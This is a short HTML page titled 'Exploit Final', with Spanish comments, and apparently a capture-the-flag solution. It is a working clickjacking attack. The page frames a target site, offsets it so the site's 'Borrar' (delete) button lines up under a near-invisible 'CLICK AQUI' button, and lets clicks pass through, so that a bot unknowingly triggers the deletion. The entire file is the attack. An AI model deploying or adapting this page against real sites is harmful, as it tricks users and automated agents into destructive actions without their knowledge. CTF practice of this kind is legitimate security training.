<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exploit Final</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: white; }

        /* El botón que el bot busca. 
           Estará ARRIBA del iframe, pero el click pasará a través de él. */
        #objetivo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 100; /* Capa superior absoluta */
            opacity: 0.01; /* Casi invisible pero 'existente' para el bot */
            cursor: pointer;
            /* El truco: el bot clica aquí, pero el evento pasa al fondo */
            pointer-events: none; 
        }

        /* Contenedor del Iframe */
        .victim-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1; /* Debajo del botón */
        }

        iframe {
            width: 100%;
            height: 1500px;
            border: none;
            /* Calibramos para que el botón 'Borrar' de la web real esté arriba */
            margin-top: -720px; 
        }
    </style>
</head>
<body>

    <button id="objetivo">CLICK AQUI</button>

    <div class="victim-container">
        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
